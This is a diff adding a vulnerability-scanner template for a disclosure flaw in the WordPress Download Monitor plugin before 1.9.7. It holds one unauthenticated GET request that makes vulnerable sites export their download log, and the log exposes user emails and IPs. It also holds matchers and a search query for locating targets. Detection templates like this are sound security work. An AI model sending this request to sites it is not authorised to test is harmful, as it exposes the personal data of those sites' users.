@@ -1,0 +1,31 @@
+id: download-monitor-unauth-log-export
+
+info:
+  name: Download Monitor < 1.9.7 - Unauthenticated Download Log Export
+  author: 0x_Akoko
+  severity: high
+  description: |
+   Detected Download Monitor plugin before 1.9.7 exposed the full download log CSV to unauthenticated users, revealing fields including User Login, User Email, User IP, and User Agent for every recorded download.
+  reference:
+    - https://github.com/download-monitor/download-monitor/commit/72d76b34a372101f0f68e904c1665f688797b662
+    - https://wordpress.org/plugins/download-monitor/
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: app="WordPress" && body="download-monitor"
+  tags: wordpress,wp-plugin,download-monitor,unauth,disclosure,exposure
+
+http:
+  - raw:
+      - |
+        GET /wp-admin/admin-ajax.php?action=test&dlm_download_logs=true HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(header, 'attachment; filename=download_log.csv')"
+          - "contains_all(body, 'Download ID', 'User Email', 'User IP')"
+        condition: and
+# digest: 4a0a004730450221009300b23227fe0b855e14c36f8d638195d526ba71438dcdef8150cd8ffb4824030220061e01bb53ce3377cfe2ab9d3fa47ad3019134d83ce92855c8f45cfaadb186bc:922c64590222798bb761d5b6d8e72950
